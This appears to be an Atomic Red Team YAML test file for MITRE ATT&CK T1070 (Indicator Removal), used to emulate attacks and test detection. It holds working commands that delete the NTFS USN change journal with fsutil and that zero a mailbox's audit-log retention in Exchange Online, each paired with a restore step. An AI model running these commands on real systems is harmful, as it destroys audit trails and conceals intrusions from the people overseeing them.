attack_technique: T1070
display_name: Indicator Removal
atomic_tests:
- name: Indicator Removal using FSUtil
  auto_generated_guid: b4115c7a-0e92-47f0-a61e-17e7218b2435
  description: |
    Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output
    will be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn
  supported_platforms:
  - windows
  executor:
    command: |
      fsutil usn deletejournal /D C:
    cleanup_command: |
      fsutil usn createjournal m=1000 a=100 c:
    name: command_prompt
    elevation_required: true
- name: Office 365 - Set Mailbox Audit Log Age Limit to Zero
  auto_generated_guid: f3d0f4d4-29ec-4cc2-b363-03d4d96c01d6
  description: |
    Use Exchange Management Shell to set the audit log retention for a mailbox to zero. It will remove all audit logs associated with the mailbox Managed Folder Assistant processes the mailbox.
    https://learn.microsoft.com/en-us/powershell/module/exchange/set-mailbox?view=exchange-ps#-auditlogagelimit
  supported_platforms:
  - office-365
  input_arguments:
    username:
      description: office-365 username
      type: string
      default:
    password:
      description: office-365 password
      type: string
      default:
    target_email:
      description: office-365 target_email
      type: string
      default:
  dependency_executor_name: powershell
  dependencies:
  - description: |
      ExchangeOnlineManagement PowerShell module must be installed
    prereq_command: |
      $RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
      if (-not $RequiredModule) {exit 1}
      if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}
    get_prereq_command: |
      Install-Module -Name ExchangeOnlineManagement         
      Import-Module ExchangeOnlineManagement
  executor:
    command: |
      $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
      $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
      Connect-ExchangeOnline -Credential $creds
      Set-Mailbox -Identity "#{target_email}" -AuditLogAgeLimit "00:00:00"
      Start-ManagedFolderAssistant -Identity "#{target_email}"
    cleanup_command: |
      $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
      $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
      Connect-ExchangeOnline -Credential $creds
      Set-Mailbox -Identity "#{target_email}" -AuditLogAgeLimit "60.00:00:00"
      Disconnect-ExchangeOnline -Confirm:$false
    name: powershell
    elevation_required: false
